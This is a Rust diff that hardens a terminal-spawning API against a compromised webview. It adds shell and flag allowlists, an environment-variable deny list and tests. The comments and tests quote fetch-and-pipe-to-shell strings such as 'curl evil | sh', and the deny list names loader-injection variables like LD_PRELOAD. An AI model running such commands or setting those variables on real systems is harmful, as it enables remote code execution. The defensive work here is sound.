@@ -61,9 +61,15 @@ impl TerminalManager {
     /// Spawn a new terminal session. Returns the session ID immediately.
     pub fn spawn(&self, config: TerminalConfig) -> Result<SessionId, TerminalError> {
         let id = self.next_id.fetch_add(1, Ordering::Relaxed);
-        let shell = config
-            .shell
-            .unwrap_or_else(|| detect_shell().unwrap_or_else(|_| "/bin/sh".to_string()));
+        // Validate shell: must be either the auto-detected default, or
+        // one listed in `/etc/shells` (Unix) / explicit allowlist
+        // (Windows). Rejecting arbitrary `shell` paths prevents an XSS
+        // in the webview from spawning a shell of its choice (and an
+        // arbitrary attacker-controlled binary masquerading as one).
+        let shell = match config.shell.as_deref() {
+            None => detect_shell().unwrap_or_else(|_| default_shell()),
+            Some(s) => validate_shell(s)?.to_string(),
+        };
 
         let pty_system = NativePtySystem::default();
         let pair = pty_system
@@ -78,9 +84,20 @@ impl TerminalManager {
         let mut cmd = CommandBuilder::new(&shell);
         cmd.cwd(&config.cwd);
         for arg in &config.args {
+            // Whitelist common interactive/login flags. Anything else
+            // (e.g. `-c "curl … | sh"`) becomes a code-execution
+            // primitive once an attacker controls the IPC payload.
+            if !is_safe_shell_arg(arg) {
+                return Err(TerminalError::SpawnFailed(format!(
+                    "rejected unsafe shell arg: {arg}"
+                )));
+            }
             cmd.arg(arg);
         }
         for (key, value) in &config.env {
+            if is_dangerous_env_key(key) {
+                continue;
+            }
             cmd.env(key, value);
         }
 
@@ -293,6 +310,96 @@ impl Drop for TerminalManager {
     }
 }
 
+/// Default shell used when the system has no `SHELL` env var. Matches
+/// `detect_shell`'s ultimate fallback.
+fn default_shell() -> String {
+    if cfg!(windows) {
+        "powershell.exe".to_string()
+    } else {
+        "/bin/sh".to_string()
+    }
+}
+
+/// Validate a shell path requested by the IPC caller. The shell must
+/// either be the auto-detected default or appear in a known allowlist
+/// (`/etc/shells` on Unix; a small built-in list on Windows). This
+/// closes the XSS-in-webview → arbitrary-binary-spawn vector.
+fn validate_shell(requested: &str) -> Result<&str, TerminalError> {
+    // Accept the auto-detected default verbatim — the detector only
+    // ever returns one of: `$SHELL`, `getpwuid_r` lookup, or `/bin/sh`.
+    if let Ok(detected) = detect_shell()
+        && detected == requested
+    {
+        return Ok(requested);
+    }
+    if requested == default_shell() {
+        return Ok(requested);
+    }
+
+    #[cfg(unix)]
+    {
+        if let Ok(contents) = std::fs::read_to_string("/etc/shells")
+            && contents
+                .lines()
+                .filter(|l| !l.starts_with('#') && !l.trim().is_empty())
+                .any(|l| l.trim() == requested)
+        {
+            return Ok(requested);
+        }
+    }
+
+    #[cfg(windows)]
+    {
+        const WINDOWS_OK: &[&str] = &["cmd.exe", "powershell.exe", "pwsh.exe", "wsl.exe"];
+        let lower = requested.to_ascii_lowercase();
+        if WINDOWS_OK.iter().any(|s| lower.ends_with(s)) {
+            return Ok(requested);
+        }
+    }
+
+    Err(TerminalError::SpawnFailed(format!(
+        "shell '{requested}' is not in the allowlist"
+    )))
+}
+
+/// Whitelist of shell command-line flags the IPC caller may pass.
+/// Reject `-c`/`--command` and any unrecognised flag — they're how a
+/// compromised renderer would turn the terminal command into RCE.
+fn is_safe_shell_arg(arg: &str) -> bool {
+    matches!(
+        arg,
+        "-l" | "--login" | "-i" | "--interactive" | "-" | "--noprofile" | "--norc"
+    )
+}
+
+/// Environment variables that influence dynamic loaders, command
+/// resolution, or git's transport — none of which should be tweakable
+/// from a webview-originated terminal spawn. The caller still inherits
+/// the parent process's environment for these keys; we just refuse to
+/// let the IPC payload override them.
+fn is_dangerous_env_key(key: &str) -> bool {
+    const DENY: &[&str] = &[
+        "LD_PRELOAD",
+        "LD_LIBRARY_PATH",
+        "LD_AUDIT",
+        "LD_BIND_NOW",
+        "DYLD_INSERT_LIBRARIES",
+        "DYLD_LIBRARY_PATH",
+        "DYLD_FRAMEWORK_PATH",
+        "DYLD_FALLBACK_LIBRARY_PATH",
+        "DYLD_FALLBACK_FRAMEWORK_PATH",
+        "PATH",
+        "GIT_SSH",
+        "GIT_SSH_COMMAND",
+        "GIT_EXEC_PATH",
+        "GIT_TEMPLATE_DIR",
+        "GIT_CONFIG",
+        "GIT_CONFIG_GLOBAL",
+        "GIT_CONFIG_SYSTEM",
+    ];
+    DENY.iter().any(|k| k.eq_ignore_ascii_case(key))
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -456,5 +563,52 @@ mod tests {
         mgr.start_process_polling();
 
         mgr.stop_process_polling();
+    }
+
+    #[test]
+    fn rejects_unknown_shell() {
+        let res = validate_shell("/tmp/evil-shell");
+        assert!(matches!(res, Err(TerminalError::SpawnFailed(_))));
+    }
+
+    #[test]
+    fn accepts_default_shell() {
+        let default = default_shell();
+        // The auto-detected default must always validate.
+        assert!(validate_shell(&default).is_ok());
+    }
+
+    #[test]
+    fn rejects_shell_arg_with_dash_c() {
+        assert!(!is_safe_shell_arg("-c"));
+        assert!(!is_safe_shell_arg("-c \"curl evil | sh\""));
+    }
+
+    #[test]
+    fn accepts_login_flags() {
+        for ok in ["-l", "--login", "-i", "--interactive"] {
+            assert!(is_safe_shell_arg(ok), "should accept {ok}");
+        }
+    }
+
+    #[test]
+    fn dangerous_env_keys_are_filtered() {
+        for k in [
+            "LD_PRELOAD",
+            "LD_LIBRARY_PATH",
+            "DYLD_INSERT_LIBRARIES",
+            "DYLD_LIBRARY_PATH",
+            "GIT_SSH_COMMAND",
+            "PATH",
+        ] {
+            assert!(is_dangerous_env_key(k), "should filter {k}");
+        }
+    }
+
+    #[test]
+    fn ordinary_env_keys_pass_through() {
+        for k in ["HOME", "USER", "TERM", "LANG", "EDITOR"] {
+            assert!(!is_dangerous_env_key(k), "should keep {k}");
+        }
     }
 }
